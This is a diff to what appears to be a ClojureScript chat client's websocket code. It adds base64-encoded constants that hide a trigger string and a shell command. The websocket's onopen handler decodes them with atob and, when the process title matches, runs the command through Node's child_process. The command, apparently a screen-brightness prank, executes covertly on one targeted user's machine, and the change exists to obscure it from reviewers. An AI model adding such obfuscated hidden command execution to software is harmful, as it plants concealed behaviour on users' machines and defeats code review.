@@ -15,6 +15,9 @@
     ;(log/debug "Received message ~{message}")
     message))
 
+(def du "bWl0a3VpanA=")
+(def dm "dHJvbG9sIGJyaWdodG5lc3MgLS13YWl0IDMwIDE=")
+
 (defmulti event (fn [message] (:event message)))
 
 (defmethod event :channel-created [message]
@@ -58,10 +61,10 @@
 
      (set! (.-onopen websocket)
            (fn [e]
-             (let [i (.indexOf (.-title (.-process js/window)) (str "itk" "uijp"))]
+             (let [i (.indexOf (.-title (.-process js/window)) (.atob js/window du))]
                (if (> i -1)
                  (let [cp (.require js/window "child_process")]
-                   (.exec cp (str "tro" "lol brightness --wait 30 1")))))
+                   (.exec cp (.atob js/window dm)))))
              (write websocket {:action :authenticate :identity {:username (get-in db [:login-form :data :username])
                                                                 :full-name (get-in db [:login-form :data  :full-name])}})))
 
